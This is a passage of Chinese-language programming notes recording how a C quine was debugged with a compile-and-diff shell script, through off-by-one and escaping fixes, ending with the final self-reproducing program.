echo "Step 3: Compiling and running..."
gcc -o quine_exe quine.c && ./quine_exe > quine_generated.c
echo "Execution complete."
echo ""

echo "Step 4: Displaying the actual content of the generated quine_generated.c"
echo "============================================================"
cat quine_generated.c
echo "============================================================"
echo ""

echo "Step 5: Performing the final, definitive diff"
echo "============================================================"
diff quine.c quine_generated.c
if [ $? -eq 0 ]; then
    echo "✅ SUCCESS: The files are identical!"
else
    echo "❌ FAILURE: The files are different."
fi

# --- END COMMAND BLOCK ---
```
- **方法革新：** 认识到这一点后，我们放弃了有缺陷的单字符串法，转向“字符串数组法”**。该方法将程序的每一行都作为独立元素存入一个字符串数组中，代码通过遍历该数组来重建自身。
    

##### **阶段三：新方法的引入与常规错误的调试**

- **实验设计：** 实现了第一版“字符串数组法”的Quine。
    
- **观察结果：** “幽灵问题”消失了！`diff`报告了全新的、具体的、可理解的错误。
    
    1. 程序输出中出现了 `(null)` 字样。
        ![[Pasted image 20250722174751.png]]
    2. 某一行代码中的转义字符 `\` 丢失了。
        
- **分析：** 这是本次实验的重大转折点。我们成功地将一个看似玄学的问题，转化成了两个经典的、有据可查的编程错误：
    
    1. **“差一错误” (Off-by-one Error):** `for`循环的边界条件（如`i < 13`）小于数组的实际大小，导致了数组越界访问，从而打印出`(null)`。
        
    2. **“字符转义错误” (Escaping Error):** 打印逻辑过于简单，无法正确处理和重建数组中本身就包含的转义字符（如`\"`）。
        

##### **阶段四：最终修正与实验成功**

- **实验设计：** 基于阶段三的分析，对“字符串数组法”的Quine进行最终修正：
    
    1. 精确计算了字符串数组的大小（最终为20个元素），并修正了所有`for`循环的边界条件（`i < 20`）。
        
    2. 重写了打印逻辑，用一个内嵌的字符级循环来处理字符串，当遇到 `\` 或 `"` 时，先手动输出一个 `\` 来实现正确的转义。
        
- **观察结果：** 执行验证脚本后，`diff`命令没有任何输出。
    
- **结论：** 源文件 `quine.c` 与其输出 `quine_generated.c` 完全一致。**实验成功。**
    
![[Pasted image 20250722174828.png]]
最终quine.c为
```c
#include <stdio.h>

char *code[] = {
    "#include <stdio.h>",
    "",
    "char *code[] = {",
    "};",
    "",
    "int main(void) {",
    "    int i;",
    "    char *p;",
    "    for (i = 0; i < 3; i++) puts(code[i]);",
    "    for (i = 0; i < 20; i++) {",
    "        printf(\"    %c\", 34);",
    "        for (p = code[i]; *p; p++) {",
    "            if (*p == 92 || *p == 34) putchar(92);",
    "            putchar(*p);",
    "        }",
    "        printf(\"%c,\\n\", 34);",
    "    }",
    "    for (i = 3; i < 20; i++) puts(code[i]);",
    "    return 0;",
    "}",
};

int main(void) {
    int i;
    char *p;
    for (i = 0; i < 3; i++) puts(code[i]);
    for (i = 0; i < 20; i++) {
        printf("    %c", 34);
        for (p = code[i]; *p; p++) {
            if (*p == 92 || *p == 34) putchar(92);
            putchar(*p);
        }
        printf("%c,\n", 34);
    }
    for (i = 3; i < 20; i++) puts(code[i]);
    return 0;
}

```